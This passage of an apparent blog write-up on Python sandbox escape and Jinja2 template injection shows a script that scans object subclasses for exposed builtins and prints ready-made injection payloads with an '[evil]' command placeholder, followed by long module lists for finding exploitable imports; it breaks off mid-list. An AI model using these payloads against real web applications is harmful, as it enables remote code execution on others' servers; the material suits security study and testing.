class="keyword">in</span> <span class="built_in">enumerate</span>(&#123;&#125;.__class__.__base__.__subclasses__()):</span><br><span class="line">    <span class="keyword">for</span> attr <span class="keyword">in</span> searchList:</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">hasattr</span>(i, attr):</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">eval</span>(<span class="string">&#x27;str(i.&#x27;</span>+attr+<span class="string">&#x27;)[1:9]&#x27;</span>) == <span class="string">&#x27;function&#x27;</span>:</span><br><span class="line">                <span class="keyword">for</span> goal <span class="keyword">in</span> neededFunction:</span><br><span class="line">                    <span class="keyword">if</span> (<span class="built_in">eval</span>(<span class="string">&#x27;&quot;&#x27;</span>+goal+<span class="string">&#x27;&quot; in i.&#x27;</span>+attr+<span class="string">&#x27;.__globals__[&quot;__builtins__&quot;].keys()&#x27;</span>)):</span><br><span class="line">                        <span class="keyword">if</span> pay != <span class="number">1</span>:</span><br><span class="line">                            <span class="built_in">print</span>(i.__name__,<span class="string">&quot;:&quot;</span>, attr, goal)</span><br><span class="line">                        <span class="keyword">else</span>:</span><br><span class="line">                            <span class="built_in">print</span>(<span class="string">&quot;&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__==&#x27;&quot;</span> + i.__name__ + <span class="string">&quot;&#x27; %&#125;&#123;&#123; c.&quot;</span> + attr + <span class="string">&quot;.__globals__[&#x27;__builtins__&#x27;].&quot;</span> + goal + <span class="string">&quot;(\&quot;[evil]\&quot;) &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>Another script for detecting modules with <code>os</code>, <code>sys</code> or <code>__builtin__</code> that we can exploit. Effective for python 2.x&#x2F;3.x</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#-*- coding:utf8 -*-</span></span><br><span class="line"><span class="comment"># &#x27;all_modules_2&#x27; is for python2.x</span></span><br><span class="line"><span class="comment"># &#x27;all_modules_3&#x27; is for python3.x</span></span><br><span class="line">all_modules_2 = [</span><br><span class="line">    <span class="string">&#x27;BaseHTTPServer&#x27;</span>, <span class="string">&#x27;imaplib&#x27;</span>, <span class="string">&#x27;shelve&#x27;</span>, <span class="string">&#x27;Bastion&#x27;</span>, <span class="string">&#x27;anydbm&#x27;</span>, <span class="string">&#x27;imghdr&#x27;</span>, <span class="string">&#x27;shlex&#x27;</span>, <span class="string">&#x27;CDROM&#x27;</span>, <span class="string">&#x27;argparse&#x27;</span>, <span class="string">&#x27;imp&#x27;</span>, <span class="string">&#x27;shutil&#x27;</span>, <span class="string">&#x27;CGIHTTPServer&#x27;</span>, <span class="string">&#x27;array&#x27;</span>, <span class="string">&#x27;importlib&#x27;</span>, <span class="string">&#x27;signal&#x27;</span>, <span class="string">&#x27;Canvas&#x27;</span>, <span class="string">&#x27;ast&#x27;</span>, <span class="string">&#x27;imputil&#x27;</span>, <span class="string">&#x27;site&#x27;</span>, <span class="string">&#x27;ConfigParser&#x27;</span>, <span class="string">&#x27;asynchat&#x27;</span>, <span class="string">&#x27;inspect&#x27;</span>, <span class="string">&#x27;sitecustomize&#x27;</span>, <span class="string">&#x27;Cookie&#x27;</span>, <span class="string">&#x27;asyncore&#x27;</span>, <span class="string">&#x27;io&#x27;</span>, <span class="string">&#x27;smtpd&#x27;</span>, <span class="string">&#x27;DLFCN&#x27;</span>, <span class="string">&#x27;atexit&#x27;</span>, <span class="string">&#x27;itertools&#x27;</span>, <span class="string">&#x27;smtplib&#x27;</span>, <span class="string">&#x27;Dialog&#x27;</span>, <span class="string">&#x27;audiodev&#x27;</span>, <span class="string">&#x27;json&#x27;</span>, <span class="string">&#x27;sndhdr&#x27;</span>, <span class="string">&#x27;DocXMLRPCServer&#x27;</span>, <span class="string">&#x27;audioop&#x27;</span>, <span class="string">&#x27;keyword&#x27;</span>, <span class="string">&#x27;socket&#x27;</span>, <span class="string">&#x27;FileDialog&#x27;</span>, <span class="string">&#x27;base64&#x27;</span>, <span class="string">&#x27;lib2to3&#x27;</span>, <span class="string">&#x27;spwd&#x27;</span>, <span class="string">&#x27;FixTk&#x27;</span>, <span class="string">&#x27;bdb&#x27;</span>, <span class="string">&#x27;linecache&#x27;</span>, <span class="string">&#x27;sqlite3&#x27;</span>, <span class="string">&#x27;HTMLParser&#x27;</span>, <span class="string">&#x27;binascii&#x27;</span>, <span class="string">&#x27;linuxaudiodev&#x27;</span>, <span class="string">&#x27;sre&#x27;</span>, <span class="string">&#x27;IN&#x27;</span>, <span class="string">&#x27;binhex&#x27;</span>, <span class="string">&#x27;locale&#x27;</span>, <span class="string">&#x27;sre_compile&#x27;</span>, <span class="string">&#x27;MimeWriter&#x27;</span>, <span class="string">&#x27;bisect&#x27;</span>, <span class="string">&#x27;logging&#x27;</span>, <span class="string">&#x27;sre_constants&#x27;</span>, <span class="string">&#x27;Queue&#x27;</span>, <span class="string">&#x27;bsddb&#x27;</span>, <span class="string">&#x27;lsb_release&#x27;</span>, <span class="string">&#x27;sre_parse&#x27;</span>, <span class="string">&#x27;ScrolledText&#x27;</span>, <span class="string">&#x27;bz2&#x27;</span>, <span class="string">&#x27;macpath&#x27;</span>, <span class="string">&#x27;ssl&#x27;</span>, <span class="string">&#x27;SimpleDialog&#x27;</span>, <span class="string">&#x27;cPickle&#x27;</span>, <span class="string">&#x27;macurl2path&#x27;</span>, <span class="string">&#x27;stat&#x27;</span>, <span class="string">&#x27;SimpleHTTPServer&#x27;</span>, <span class="string">&#x27;cProfile&#x27;</span>, <span class="string">&#x27;mailbox&#x27;</span>, <span class="string">&#x27;statvfs&#x27;</span>, <span class="string">&#x27;SimpleXMLRPCServer&#x27;</span>, <span class="string">&#x27;cStringIO&#x27;</span>, <span class="string">&#x27;mailcap&#x27;</span>, <span class="string">&#x27;string&#x27;</span>, <span class="string">&#x27;SocketServer&#x27;</span>, <span class="string">&#x27;calendar&#x27;</span>, <span class="string">&#x27;markupbase&#x27;</span>, <span class="string">&#x27;stringold&#x27;</span>, <span class="string">&#x27;StringIO&#x27;</span>, <span class="string">&#x27;cgi&#x27;</span>, <span class="string">&#x27;marshal&#x27;</span>, <span class="string">&#x27;stringprep&#x27;</span>, <span class="string">&#x27;TYPES&#x27;</span>, <span class="string">&#x27;cgitb&#x27;</span>, <span class="string">&#x27;math&#x27;</span>, <span class="string">&#x27;strop&#x27;</span>, <span class="string">&#x27;Tix&#x27;</span>, <span class="string">&#x27;chunk&#x27;</span>, <span class="string">&#x27;md5&#x27;</span>, <span class="string">&#x27;struct&#x27;</span>, <span class="string">&#x27;Tkconstants&#x27;</span>, <span class="string">&#x27;cmath&#x27;</span>, <span class="string">&#x27;mhlib&#x27;</span>, <span class="string">&#x27;subprocess&#x27;</span>, <span class="string">&#x27;Tkdnd&#x27;</span>, <span class="string">&#x27;cmd&#x27;</span>, <span class="string">&#x27;mimetools&#x27;</span>, <span class="string">&#x27;sunau&#x27;</span>, <span class="string">&#x27;Tkinter&#x27;</span>, <span class="string">&#x27;code&#x27;</span>, <span class="string">&#x27;mimetypes&#x27;</span>, <span class="string">&#x27;sunaudio&#x27;</span>, <span class="string">&#x27;UserDict&#x27;</span>, <span class="string">&#x27;codecs&#x27;</span>, <span class="string">&#x27;mimify&#x27;</span>, <span class="string">&#x27;symbol&#x27;</span>, <span class="string">&#x27;UserList&#x27;</span>, <span class="string">&#x27;codeop&#x27;</span>, <span class="string">&#x27;mmap&#x27;</span>, <span class="string">&#x27;symtable&#x27;</span>, <span class="string">&#x27;UserString&#x27;</span>, <span class="string">&#x27;collections&#x27;</span>, <span class="string">&#x27;modulefinder&#x27;</span>, <span class="string">&#x27;sys&#x27;</span>, <span class="string">&#x27;_LWPCookieJar&#x27;</span>, <span class="string">&#x27;colorsys&#x27;</span>, <span class="string">&#x27;multifile&#x27;</span>, <span class="string">&#x27;sysconfig&#x27;</span>, <span class="string">&#x27;_MozillaCookieJar&#x27;</span>, <span class="string">&#x27;commands&#x27;</span>, <span class="string">&#x27;multiprocessing&#x27;</span>, <span class="string">&#x27;syslog&#x27;</span>, <span class="string">&#x27;__builtin__&#x27;</span>, <span class="string">&#x27;compileall&#x27;</span>, <span class="string">&#x27;mutex&#x27;</span>, <span class="string">&#x27;tabnanny&#x27;</span>, <span class="string">&#x27;__future__&#x27;</span>, <span class="string">&#x27;compiler&#x27;</span>, <span class="string">&#x27;netrc&#x27;</span>, <span class="string">&#x27;talloc&#x27;</span>, <span class="string">&#x27;_abcoll&#x27;</span>, <span class="string">&#x27;contextlib&#x27;</span>, <span class="string">&#x27;new&#x27;</span>, <span class="string">&#x27;tarfile&#x27;</span>, <span class="string">&#x27;_ast&#x27;</span>, <span class="string">&#x27;cookielib&#x27;</span>, <span class="string">&#x27;nis&#x27;</span>, <span class="string">&#x27;telnetlib&#x27;</span>, <span class="string">&#x27;_bisect&#x27;</span>, <span class="string">&#x27;copy&#x27;</span>, <span class="string">&#x27;nntplib&#x27;</span>, <span class="string">&#x27;tempfile&#x27;</span>, <span class="string">&#x27;_bsddb&#x27;</span>, <span class="string">&#x27;copy_reg&#x27;</span>, <span class="string">&#x27;ntpath&#x27;</span>, <span class="string">&#x27;termios&#x27;</span>, <span class="string">&#x27;_codecs&#x27;</span>, <span class="string">&#x27;crypt&#x27;</span>, <span class="string">&#x27;nturl2path&#x27;</span>, <span class="string">&#x27;test&#x27;</span>, <span class="string">&#x27;_codecs_cn&#x27;</span>, <span class="string">&#x27;csv&#x27;</span>, <span class="string">&#x27;numbers&#x27;</span>, <span class="string">&#x27;textwrap&#x27;</span>, <span class="string">&#x27;_codecs_hk&#x27;</span>, <span class="string">&#x27;ctypes&#x27;</span>, <span class="string">&#x27;opcode&#x27;</span>, <span class="string">&#x27;_codecs_iso2022&#x27;</span>, <span class="string">&#x27;curses&#x27;</span>, <span class="string">&#x27;operator&#x27;</span>, <span class="string">&#x27;thread&#x27;</span>, <span class="string">&#x27;_codecs_jp&#x27;</span>, <span class="string">&#x27;datetime&#x27;</span>, <span class="string">&#x27;optparse&#x27;</span>, <span class="string">&#x27;threading&#x27;</span>, <span class="string">&#x27;_codecs_kr&#x27;</span>, <span class="string">&#x27;dbhash&#x27;</span>, <span class="string">&#x27;os&#x27;</span>, <span class="string">&#x27;time&#x27;</span>, <span class="string">&#x27;_codecs_tw&#x27;</span>, <span class="string">&#x27;dbm&#x27;</span>, <span class="string">&#x27;os2emxpath&#x27;</span>, <span class="string">&#x27;timeit&#x27;</span>, <span class="string">&#x27;_collections&#x27;</span>, <span class="string">&#x27;decimal&#x27;</span>, <span class="string">&#x27;ossaudiodev&#x27;</span>, <span class="string">&#x27;tkColorChooser&#x27;</span>, <span class="string">&#x27;_csv&#x27;</span>, <span class="string">&#x27;difflib&#x27;</span>, <span class="string">&#x27;parser&#x27;</span>, <span class="string">&#x27;tkCommonDialog&#x27;</span>, <span class="string">&#x27;_ctypes&#x27;</span>, <span class="string">&#x27;dircache&#x27;</span>, <span class="string">&#x27;pdb&#x27;</span>, <span class="string">&#x27;tkFileDialog&#x27;</span>, <span class="string">&#x27;_ctypes_test&#x27;</span>, <span class="string">&#x27;dis&#x27;</span>, <span class="string">&#x27;pickle&#x27;</span>, <span class="string">&#x27;tkFont&#x27;</span>, <span class="string">&#x27;_curses&#x27;</span>, <span class="string">&#x27;distutils&#x27;</span>, <span class="string">&#x27;pickletools&#x27;</span>, <span class="string">&#x27;tkMessageBox&#x27;</span>, <span class="string">&#x27;_curses_panel&#x27;</span>, <span class="string">&#x27;doctest&#x27;</span>, <span class="string">&#x27;pipes&#x27;</span>, <span class="string">&#x27;tkSimpleDialog&#x27;</span>, <span class="string">&#x27;_elementtree&#x27;</span>, <span class="string">&#x27;dumbdbm&#x27;</span>, <span class="string">&#x27;pkgutil&#x27;</span>, <span class="string">&#x27;toaiff&#x27;</span>, <span class="string">&#x27;_functools&#x27;</span>, <span class="string">&#x27;dummy_thread&#x27;</span>, <span class="string">&#x27;platform&#x27;</span>, <span class="string">&#x27;token&#x27;</span>, <span class="string">&#x27;_hashlib&#x27;</span>, <span class="string">&#x27;dummy_threading&#x27;</span>, <span class="string">&#x27;plistlib&#x27;</span>, <span class="string">&#x27;tokenize&#x27;</span>, <span class="string">&#x27;_heapq&#x27;</span>, <span class="string">&#x27;email&#x27;</span>, <span class="string">&#x27;popen2&#x27;</span>, <span class="string">&#x27;trace&#x27;</span>, <span class="string">&#x27;_hotshot&#x27;</span>, <span class="string">&#x27;encodings&#x27;</span>, <span class="string">&#x27;poplib&#x27;</span>, <span class="string">&#x27;traceback&#x27;</span>, <span class="string">&#x27;_io&#x27;</span>, <span class="string">&#x27;ensurepip&#x27;</span>, <span class="string">&#x27;posix&#x27;</span>, <span class="string">&#x27;ttk&#x27;</span>, <span class="string">&#x27;_json&#x27;</span>, <span class="string">&#x27;errno&#x27;</span>, <span class="string">&#x27;posixfile&#x27;</span>, <span class="string">&#x27;tty&#x27;</span>, <span class="string">&#x27;_locale&#x27;</span>, <span class="string">&#x27;exceptions&#x27;</span>, <span class="string">&#x27;posixpath&#x27;</span>, <span class="string">&#x27;turtle&#x27;</span>, <span class="string">&#x27;_lsprof&#x27;</span>, <span class="string">&#x27;fcntl&#x27;</span>, <span class="string">&#x27;pprint&#x27;</span>, <span class="string">&#x27;types&#x27;</span>, <span class="string">&#x27;_md5&#x27;</span>, <span class="string">&#x27;filecmp&#x27;</span>, <span class="string">&#x27;profile&#x27;</span>, <span class="string">&#x27;unicodedata&#x27;</span>, <span class="string">&#x27;_multibytecodec&#x27;</span>, <span class="string">&#x27;fileinput&#x27;</span>, <span class="string">&#x27;pstats&#x27;</span>, <span class="string">&#x27;unittest&#x27;</span>, <span class="string">&#x27;_multiprocessing&#x27;</span>, <span class="string">&#x27;fnmatch&#x27;</span>, <span class="string">&#x27;pty&#x27;</span>, <span class="string">&#x27;urllib&#x27;</span>, <span class="string">&#x27;_osx_support&#x27;</span>, <span class="string">&#x27;formatter&#x27;</span>, <span class="string">&#x27;pwd&#x27;</span>, <span class="string">&#x27;urllib2&#x27;</span>, <span class="string">&#x27;_pyio&#x27;</span>, <span class="string">&#x27;fpformat&#x27;</span>, <span class="string">&#x27;py_compile&#x27;</span>, <span class="string">&#x27;urlparse&#x27;</span>, <span class="string">&#x27;_random&#x27;</span>, <span class="string">&#x27;fractions&#x27;</span>, <span class="string">&#x27;pyclbr&#x27;</span>, <span class="string">&#x27;user&#x27;</span>, <span class="string">&#x27;_sha&#x27;</span>, <span class="string">&#x27;ftplib&#x27;</span>, <span class="string">&#x27;pydoc&#x27;</span>, <span class="string">&#x27;uu&#x27;</span>, <span class="string">&#x27;_sha256&#x27;</span>, <span class="string">&#x27;functools&#x27;</span>, <span class="string">&#x27;pydoc_data&#x27;</span>, <span class="string">&#x27;uuid&#x27;</span>, <span class="string">&#x27;_sha512&#x27;</span>, <span class="string">&#x27;future_builtins&#x27;</span>, <span class="string">&#x27;pyexpat&#x27;</span>, <span class="string">&#x27;warnings&#x27;</span>, <span class="string">&#x27;_socket&#x27;</span>, <span class="string">&#x27;gc&#x27;</span>, <span class="string">&#x27;quopri&#x27;</span>, <span class="string">&#x27;wave&#x27;</span>, <span class="string">&#x27;_sqlite3&#x27;</span>, <span class="string">&#x27;genericpath&#x27;</span>, <span class="string">&#x27;random&#x27;</span>, <span class="string">&#x27;weakref&#x27;</span>, <span class="string">&#x27;_sre&#x27;</span>, <span class="string">&#x27;getopt&#x27;</span>, <span class="string">&#x27;re&#x27;</span>, <span class="string">&#x27;webbrowser&#x27;</span>, <span class="string">&#x27;_ssl&#x27;</span>, <span class="string">&#x27;getpass&#x27;</span>, <span class="string">&#x27;readline&#x27;</span>, <span class="string">&#x27;whichdb&#x27;</span>, <span class="string">&#x27;_strptime&#x27;</span>, <span class="string">&#x27;gettext&#x27;</span>, <span class="string">&#x27;repr&#x27;</span>, <span class="string">&#x27;wsgiref&#x27;</span>, <span class="string">&#x27;_struct&#x27;</span>, <span class="string">&#x27;glob&#x27;</span>, <span class="string">&#x27;resource&#x27;</span>, <span class="string">&#x27;xdrlib&#x27;</span>, <span class="string">&#x27;_symtable&#x27;</span>, <span class="string">&#x27;grp&#x27;</span>, <span class="string">&#x27;rexec&#x27;</span>, <span class="string">&#x27;xml&#x27;</span>, <span class="string">&#x27;_sysconfigdata&#x27;</span>, <span class="string">&#x27;gzip&#x27;</span>, <span class="string">&#x27;rfc822&#x27;</span>, <span class="string">&#x27;xmllib&#x27;</span>, <span class="string">&#x27;_sysconfigdata_nd&#x27;</span>, <span class="string">&#x27;hashlib&#x27;</span>, <span class="string">&#x27;rlcompleter&#x27;</span>, <span class="string">&#x27;xmlrpclib&#x27;</span>, <span class="string">&#x27;_testcapi&#x27;</span>, <span class="string">&#x27;heapq&#x27;</span>, <span class="string">&#x27;robotparser&#x27;</span>, <span class="string">&#x27;xxsubtype&#x27;</span>, <span class="string">&#x27;_threading_local&#x27;</span>, <span class="string">&#x27;hmac&#x27;</span>, <span class="string">&#x27;runpy&#x27;</span>, <span class="string">&#x27;zipfile&#x27;</span>, <span class="string">&#x27;_warnings&#x27;</span>, <span class="string">&#x27;hotshot&#x27;</span>, <span class="string">&#x27;sched&#x27;</span>, <span class="string">&#x27;zipimport&#x27;</span>, <span class="string">&#x27;_weakref&#x27;</span>, <span class="string">&#x27;htmlentitydefs&#x27;</span>, <span class="string">&#x27;select&#x27;</span>, <span class="string">&#x27;zlib&#x27;</span>, <span class="string">&#x27;_weakrefset&#x27;</span>, <span class="string">&#x27;htmllib&#x27;</span>, <span class="string">&#x27;sets&#x27;</span>, <span class="string">&#x27;abc&#x27;</span>, <span class="string">&#x27;httplib&#x27;</span>, <span class="string">&#x27;sgmllib&#x27;</span>, <span class="string">&#x27;aifc&#x27;</span>, <span class="string">&#x27;ihooks&#x27;</span>, <span class="string">&#x27;sha&#x27;</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">all_modules_3 = [</span><br><span class="line">    <span class="string">&#x27;AptUrl&#x27;</span>, <span class="string">&#x27;hmac&#x27;</span>, <span class="string">&#x27;requests_unixsocket&#x27;</span>, <span class="string">&#x27;CommandNotFound&#x27;</span>, <span class="string">&#x27;apport&#x27;</span>, <span class="string">&#x27;hpmudext&#x27;</span>, <span class="string">&#x27;resource&#x27;</span>, <span class="string">&#x27;Crypto&#x27;</span>, <span class="string">&#x27;apport_python_hook&#x27;</span>, <span class="string">&#x27;html&#x27;</span>, <span class="string">&#x27;rlcompleter&#x27;</span>, <span class="string">&#x27;DistUpgrade&#x27;</span>, <span class="string">&#x27;apt&#x27;</span>, <span class="string">&#x27;http&#x27;</span>, <span class="string">&#x27;runpy&#x27;</span>, <span class="string">&#x27;HweSupportStatus&#x27;</span>, <span class="string">&#x27;apt_inst&#x27;</span>, <span class="string">&#x27;httplib2&#x27;</span>, <span class="string">&#x27;scanext&#x27;</span>, <span class="string">&#x27;LanguageSelector&#x27;</span>, <span class="string">&#x27;apt_pkg&#x27;</span>, <span class="string">&#x27;idna&#x27;</span>, <span class="string">&#x27;sched&#x27;</span>, <span class="string">&#x27;NvidiaDetector&#x27;</span>, <span class="string">&#x27;aptdaemon&#x27;</span>, <span class="string">&#x27;imaplib&#x27;</span>, <span class="string">&#x27;secrets&#x27;</span>, <span class="string">&#x27;PIL&#x27;</span>, <span class="string">&#x27;aptsources&#x27;</span>, <span class="string">&#x27;imghdr&#x27;</span>, <span class="string">&#x27;secretstorage&#x27;</span>, <span class="string">&#x27;Quirks&#x27;</span>, <span class="string">&#x27;argparse&#x27;</span>, <span class="string">&#x27;imp&#x27;</span>, <span class="string">&#x27;select&#x27;</span>, <span class="string">&#x27;UbuntuDrivers&#x27;</span>, <span class="string">&#x27;array&#x27;</span>, <span class="string">&#x27;importlib&#x27;</span>, <span class="string">&#x27;selectors&#x27;</span>, <span class="string">&#x27;UbuntuSystemService&#x27;</span>, <span class="string">&#x27;asn1crypto&#x27;</span>, <span class="string">&#x27;inspect&#x27;</span>, <span class="string">&#x27;shelve&#x27;</span>, <span class="string">&#x27;UpdateManager&#x27;</span>, <span class="string">&#x27;ast&#x27;</span>, <span class="string">&#x27;io&#x27;</span>, <span class="string">&#x27;shlex&#x27;</span>, <span class="string">&#x27;__future__&#x27;</span>, <span class="string">&#x27;asynchat&#x27;</span>, <span class="string">&#x27;ipaddress&#x27;</span>, <span class="string">&#x27;shutil&#x27;</span>, <span class="string">&#x27;_ast&#x27;</span>, <span class="string">&#x27;asyncio&#x27;</span>, <span class="string">&#x27;itertools&#x27;</span>, <span class="string">&#x27;signal&#x27;</span>, <span class="string">&#x27;_asyncio&#x27;</span>, <span class="string">&#x27;asyncore&#x27;</span>, <span class="string">&#x27;janitor&#x27;</span>, <span class="string">&#x27;simplejson&#x27;</span>, <span class="string">&#x27;_bisect&#x27;</span>, <span class="string">&#x27;atexit&#x27;</span>, <span class="string">&#x27;json&#x27;</span>, <span class="string">&#x27;site&#x27;</span>, <span class="string">&#x27;_blake2&#x27;</span>, <span class="string">&#x27;audioop&#x27;</span>, <span class="string">&#x27;keyring&#x27;</span>, <span class="string">&#x27;sitecustomize&#x27;</span>, <span class="string">&#x27;_bootlocale&#x27;</span>, <span class="string">&#x27;base64&#x27;</span>, <span class="string">&#x27;keyword&#x27;</span>, <span class="string">&#x27;six&#x27;</span>, <span class="string">&#x27;_bz2&#x27;</span>, <span class="string">&#x27;bdb&#x27;</span>, <span class="string">&#x27;language_support_pkgs&#x27;</span>, <span class="string">&#x27;smtpd&#x27;</span>, <span class="string">&#x27;_cffi_backend&#x27;</span>, <span class="string">&#x27;binascii&#x27;</span>, <span class="string">&#x27;launchpadlib&#x27;</span>, <span class="string">&#x27;smtplib&#x27;</span>, <span class="string">&#x27;_codecs&#x27;</span>, <span class="string">&#x27;binhex&#x27;</span>, <span class="string">&#x27;linecache&#x27;</span>, <span class="string">&#x27;sndhdr&#x27;</span>, <span class="string">&#x27;_codecs_cn&#x27;</span>, <span class="string">&#x27;bisect&#x27;</span>, <span class="string">&#x27;locale&#x27;</span>, <span class="string">&#x27;socket&#x27;</span>, <span class="string">&#x27;_codecs_hk&#x27;</span>, <span class="string">&#x27;brlapi&#x27;</span>, <span class="string">&#x27;logging&#x27;</span>, <span class="string">&#x27;socketserver&#x27;</span>, <span class="string">&#x27;_codecs_iso2022&#x27;</span>, <span class="string">&#x27;builtins&#x27;</span>, <span class="string">&#x27;louis&#x27;</span>, <span class="string">&#x27;softwareproperties&#x27;</span>, <span class="string">&#x27;_codecs_jp&#x27;</span>, <span class="string">&#x27;bz2&#x27;</span>, <span class="string">&#x27;lsb_release&#x27;</span>, <span class="string">&#x27;speechd&#x27;</span>, <span class="string">&#x27;_codecs_kr&#x27;</span>, <span class="string">&#x27;cProfile&#x27;</span>, <span class="string">&#x27;lzma&#x27;</span>, <span class="string">&#x27;speechd_config&#x27;</span>, <span class="string">&#x27;_codecs_tw&#x27;</span>, <span class="string">&#x27;cairo&#x27;</span>, <span class="string">&#x27;macaroonbakery&#x27;</span>, <span class="string">&#x27;spwd&#x27;</span>, <span class="string">&#x27;_collections&#x27;</span>, <span class="string">&#x27;calendar&#x27;</span>, <span class="string">&#x27;macpath&#x27;</span>, <span class="string">&#x27;sqlite3&#x27;</span>, <span class="string">&#x27;_collections_abc&#x27;</span>, <span class="string">&#x27;certifi&#x27;</span>, <span class="string">&#x27;macurl2path&#x27;</span>, <span class="string">&#x27;sre_compile&#x27;</span>, <span class="string">&#x27;_compat_pickle&#x27;</span>, <span class="string">&#x27;cgi&#x27;</span>, <span class="string">&#x27;mailbox&#x27;</span>, <span class="string">&#x27;sre_constants&#x27;</span>, <span class="string">&#x27;_compression&#x27;</span>, <span class="string">&#x27;cgitb&#x27;</span>, <span class="string">&#x27;mailcap&#x27;</span>, <span class="string">&#x27;sre_parse&#x27;</span>, <span class="string">&#x27;_crypt&#x27;</span>, <span class="string">&#x27;chardet&#x27;</span>, <span class="string">&#x27;mako&#x27;</span>, <span class="string">&#x27;ssl&#x27;</span>, <span class="string">&#x27;_csv&#x27;</span>, <span class="string">&#x27;chunk&#x27;</span>, <span class="string">&#x27;markupsafe&#x27;</span>, <span class="string">&#x27;stat&#x27;</span>, <span class="string">&#x27;_ctypes&#x27;</span>, <span class="string">&#x27;cmath&#x27;</span>, <span class="string">&#x27;marshal&#x27;</span>, <span class="string">&#x27;statistics&#x27;</span>, <span class="string">&#x27;_ctypes_test&#x27;</span>, <span class="string">&#x27;cmd&#x27;</span>, <span class="string">&#x27;math&#x27;</span>, <span class="string">&#x27;string&#x27;</span>, <span class="string">&#x27;_curses&#x27;</span>, <span class="string">&#x27;code&#x27;</span>, <span class="string">&#x27;mimetypes&#x27;</span>, <span class="string">&#x27;stringprep&#x27;</span>, <span class="string">&#x27;_curses_panel&#x27;</span>, <span class="string">&#x27;codecs&#x27;</span>, <span class="string">&#x27;mmap&#x27;</span>, <span class="string">&#x27;struct&#x27;</span>, <span class="string">&#x27;_datetime&#x27;</span>, <span class="string">&#x27;codeop&#x27;</span>, <span class="string">&#x27;modual_test&#x27;</span>, <span class="string">&#x27;subprocess&#x27;</span>, <span class="string">&#x27;_dbm&#x27;</span>, <span class="string">&#x27;collections&#x27;</span>, <span class="string">&#x27;modulefinder&#x27;</span>, <span class="string">&#x27;sunau&#x27;</span>, <span class="string">&#x27;_dbus_bindings&#x27;</span>, <span class="string">&#x27;colorsys&#x27;</span>, <span class="string">&#x27;multiprocessing&#x27;</span>, <span class="string">&#x27;symbol&#x27;</span>, <span class="string">&#x27;_dbus_glib_bindings&#x27;</span>, <span class="string">&#x27;compileall&#x27;</span>, <span class="string">&#x27;nacl&#x27;</span>, <span class="string">&#x27;symtable&#x27;</span>, <span class="string">&#x27;_decimal&#x27;</span>, <span class="string">&#x27;concurrent&#x27;</span>, <span class="string">&#x27;netrc&#x27;</span>, <span class="string">&#x27;sys&#x27;</span>, <span class="string">&#x27;_dummy_thread&#x27;</span>, <span class="string">&#x27;configparser&#x27;</span>, <span class="string">&#x27;nis&#x27;</span>, <span class="string">&#x27;sysconfig&#x27;</span>, <span class="string">&#x27;_elementtree&#x27;</span>, <span class="string">&#x27;contextlib&#x27;</span>, <span class="string">&#x27;nntplib&#x27;</span>, <span class="string">&#x27;syslog&#x27;</span>, <span class="string">&#x27;_functools&#x27;</span>, <span class="string">&#x27;copy&#x27;</span>, <span class="string">&#x27;ntpath&#x27;</span>, <span class="string">&#x27;systemd&#x27;</span>, <span class="string">&#x27;_gdbm&#x27;</span>, <span class="string">&#x27;copyreg&#x27;</span>, <span class="string">&#x27;nturl2path&#x27;</span>, <span class="string">&#x27;tabnanny&#x27;</span>, <span class="string">&#x27;_hashlib&#x27;</span>, <span class="string">&#x27;crypt&#x27;</span>, <span class="string">&#x27;numbers&#x27;</span>, <span class="string">&#x27;tarfile&#x27;</span>, <span class="string">&#x27;_heapq&#x27;</span>, <span class="string">&#x27;cryptography&#x27;</span>, <span class="string">&#x27;oauth&#x27;</span>, <span class="string">&#x27;telnetlib&#x27;</span>, <span class="string">&#x27;_imp&#x27;</span>, <span class="string">&#x27;csv&#x27;</span>, <span class="string">&#x27;olefile&#x27;</span>, <span class="string">&#x27;tempfile&#x27;</span>, <span class="string">&#x27;_io&#x27;</span>, <span class="string">&#x27;ctypes&#x27;</span>, <span class="string">&#x27;opcode&#x27;</span>, <span class="string">&#x27;termios&#x27;</span>, <span class="string">&#x27;_json&#x27;</span>, <span class="string">&#x27;cups&#x27;</span>, <span class="string">&#x27;operator&#x27;</span>, <span class="string">&#x27;test&#x27;</span>, <span class="string">&#x27;_locale&#x27;</span>, <span class="string">&#x27;cupsext&#x27;</span>, <span class="string">&#x27;optparse&#x27;</span>, <span class="string">&#x27;textwrap&#x27;</span>, <span class="string">&#x27;_lsprof&#x27;</span>, <span class="string">&#x27;cupshelpers&#x27;</span>, <span class="string">&#x27;orca&#x27;</span>, <span class="string">&#x27;_lzma&#x27;</span>, <span class="string">&#x27;curses&#x27;</span>, <span class="string">&#x27;os&#x27;</span>, <span class="string">&#x27;threading&#x27;</span>, <span class="string">&#x27;_markupbase&#x27;</span>, <span class="string">&#x27;datetime&#x27;</span>, <span class="string">&#x27;ossaudiodev&#x27;</span>, <span class="string">&#x27;time&#x27;</span>, <span class="string">&#x27;_md5&#x27;</span>, <span class="string">&#x27;dbm&#x27;</span>, <span class="string">&#x27;parser&#x27;</span>, <span class="string">&#x27;timeit&#x27;</span>, <span class="string">&#x27;_multibytecodec&#x27;</span>, <span class="string">&#x27;dbus&#x27;</span>, <span class="string">&#x27;pathlib&#x27;</span>, <span class="string">&#x27;token&#x27;</span>, <span class="string">&#x27;_multiprocessing&#x27;</span>, <span class="string">&#x27;deb822&#x27;</span>, <span class="string">&#x27;pcardext&#x27;</span>, <span class="string">&#x27;tokenize&#x27;</span>, <span class="string">&#x27;_opcode&#x27;</span>, <span class="string">&#x27;debconf&#x27;</span>, <span class="string">&#x27;pdb&#x27;</span>, <span class="string">&#x27;trace&#x27;</span>, <span class="string">&#x27;_operator&#x27;</span>, <span class="string">&#x27;debian&#x27;</span>, <span class="string">&#x27;pexpect&#x27;</span>, <span class="string">&#x27;traceback&#x27;</span>, <span class="string">&#x27;_osx_support&#x27;</span>, <span class="string">&#x27;debian_bundle&#x27;</span>, <span class="string">&#x27;pickle&#x27;</span>, <span class="string">&#x27;tracemalloc&#x27;</span>, <span class="string">&#x27;_pickle&#x27;</span>, <span class="string">&#x27;decimal&#x27;</span>, <span class="string">&#x27;pickletools&#x27;</span>, <span class="string">&#x27;tty&#x27;</span>, <span class="string">&#x27;_posixsubprocess&#x27;</span>, <span class="string">&#x27;defer&#x27;</span>, 